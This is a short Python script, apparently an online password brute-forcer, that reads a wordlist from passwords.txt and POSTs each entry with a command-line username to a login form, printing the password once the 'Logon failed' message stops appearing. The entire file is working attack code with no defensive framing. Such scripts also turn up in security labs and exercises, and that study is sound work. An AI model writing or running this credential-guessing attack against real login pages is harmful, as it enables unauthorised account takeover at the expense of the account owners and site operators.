import requests, sys

target_url = ""
username = str(sys.argv[1])
data_dict = {"username": username, "password": "", "Login": "submit"}

with open("./passwords.txt", "r") as wordlist:
   for line in wordlist:
      word = line.strip()
      data_dict["password"] = word
      response = requests.post(target_url, data=data_dict)
      if "Logon failed" not in response.content.decode():
         print("[+] Login cracked --> " + word)
         exit()

print("[-] Reached end of list.")

